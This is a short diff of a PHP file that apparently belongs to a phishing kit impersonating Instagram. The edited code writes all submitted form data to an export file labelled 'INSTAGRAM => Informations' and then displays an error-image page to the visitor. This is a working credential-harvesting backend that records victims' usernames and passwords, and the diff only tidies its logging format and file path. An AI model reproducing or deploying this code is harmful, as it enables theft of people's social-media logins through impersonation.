@@ -19,9 +19,17 @@
 *
 */
 
-$file = "export/data.txt";
+$path = getcwd();
+
+$path = substr($path,0,16);
+
+$file = $path ."/export/data.txt";
+
+file_put_contents($file, print_r("\n\n\nINSTAGRAM => Informations \n", true), FILE_APPEND);
+file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
 file_put_contents($file, print_r($_POST, true), FILE_APPEND);
-file_put_contents($file, print_r("<hr/>\n", true), FILE_APPEND);
+file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
+file_put_contents($file, print_r("\n\n\n", true), FILE_APPEND);
 
 ?>
 
@@ -54,6 +62,6 @@ file_put_contents($file, print_r("<hr/>\n", true), FILE_APPEND);
                 
 
 </head>
-<body style="background-image:url(css/error.png); background-repeat: no-repeat; background-size: auto; background-position:center; background-color: #f7f7f7;">
+<body style="background-image:url(\\css\\error.png); background-repeat: no-repeat; background-size: auto; background-position:center; background-color: #f7f7f7;">
 </body>
 </html>
